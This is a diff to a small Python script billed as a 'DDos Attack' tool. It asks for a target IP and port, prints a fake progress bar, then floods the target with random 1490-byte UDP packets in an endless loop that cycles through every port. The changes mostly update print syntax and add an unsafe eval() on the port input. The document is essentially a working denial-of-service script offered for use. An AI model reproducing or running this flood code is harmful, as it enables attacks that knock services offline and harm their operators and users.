@@ -19,27 +19,28 @@ bytes = random._urandom(1490)
 
 os.system("clear")
 os.system("figlet DDos Attack")
+print("Author   : HA-MRX")
 print ("Modded by:  neon-l")
-ip = input("Your Target IP : ")
-port = input("Target Port      : ")
+ip = input("IP Target : ")
+port = eval(input("Port       : "))
+
 os.system("clear")
 os.system("figlet Attack Starting")
-print ("[                    ] 0% ")
+print("[                    ] 0% ")
 time.sleep(1)
-print ("[=====               ] 25%")
+print("[=====               ] 25%")
 time.sleep(1)
-print ("[==========          ] 50%")
+print("[==========          ] 50%")
 time.sleep(1)
-print ("[===============     ] 75%")
+print("[===============     ] 75%")
 time.sleep(1)
-print ("[====================] 100%")
+print("[====================] 100%")
 time.sleep(1)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print ("Sent %s packets to %s throught port:%s")%(sent,ip,port)
+     print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
      if port == 65534:
        port = 1
-
